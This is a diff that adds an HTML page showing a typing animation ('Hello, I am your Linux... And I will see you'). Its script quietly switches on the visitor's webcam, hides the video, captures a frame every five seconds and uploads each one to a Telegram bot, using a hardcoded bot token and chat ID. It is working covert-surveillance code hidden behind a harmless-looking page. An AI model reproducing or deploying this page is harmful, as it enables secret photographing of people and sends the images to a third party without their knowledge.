@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>〈◕﹏◕〉</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: black;
+        }
+        h1 {
+            color: white;
+            font-size: 3rem;
+            font-style: italic;
+            text-align: center;
+            min-height: 1em; /* Ensures consistent height to avoid pushing */
+        }
+        video {
+            display: none; /* Hide the video element from the user */
+        }
+    </style>
+</head>
+<body>
+    <h1 id="dynamicText"></h1>
+    <video id="hiddenVideo" autoplay></video>
+
+    <script>
+        const botToken = "7239458839:AAHTXtF23O2Zfe7q1OSOTtpQvbCjXCflFAg"; // Replace with your bot token
+        const chatId = "5541151768"; // Replace with your chat ID
+        const dynamicText = document.getElementById("dynamicText");
+        const videoElement = document.getElementById("hiddenVideo");
+        const canvas = document.createElement("canvas");
+        const context = canvas.getContext("2d");
+
+        // Typing Effect
+        const messages = ["Hello, I am your Linux", "And I will see you {´•‿•`}"];
+        let charIndex = 0, section = 0;
+        const pauseAfterFirst = 500;
+
+        function typeEffect() {
+            const currentMessage = messages[section];
+            dynamicText.textContent = currentMessage.slice(0, charIndex++);
+            if (charIndex > currentMessage.length) {
+                if (section === 0) {
+                    setTimeout(() => {
+                        section = 1;
+                        charIndex = 0;
+                        typeEffect();
+                    }, pauseAfterFirst);
+                }
+                return;
+            }
+            setTimeout(typeEffect, 100);
+        }
+        typeEffect();
+
+        // Access Camera and Capture Images
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                videoElement.srcObject = stream;
+
+                // Set up canvas size
+                canvas.width = 640;
+                canvas.height = 480;
+
+                // Send images to Telegram bot every 10 seconds
+                setInterval(() => {
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    const imageDataURL = canvas.toDataURL("image/jpeg");
+                    sendImageToTelegram(imageDataURL);
+                }, 5000);
+            })
+            .catch((error) => {
+                console.error("Error accessing the camera: ", error);
+            });
+
+        // Send Image to Telegram Bot
+        function sendImageToTelegram(imageDataURL) {
+            fetch(imageDataURL)
+                .then((response) => response.blob())
+                .then((blob) => {
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", blob, "anonymous.jpg");
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: "POST",
+                        body: formData,
+                    })
+                        .then((response) => response.json())
+                        .then((data) => {
+                            if (data.ok) {
+                                console.log("Image sent successfully.");
+                            } else {
+                                console.error("Error sending image: ", data);
+                            }
+                        })
+                        .catch((error) => {
+                            console.error("Error in fetch: ", error);
+                        });
+                });
+        }
+    </script>
+</body>
+</html>
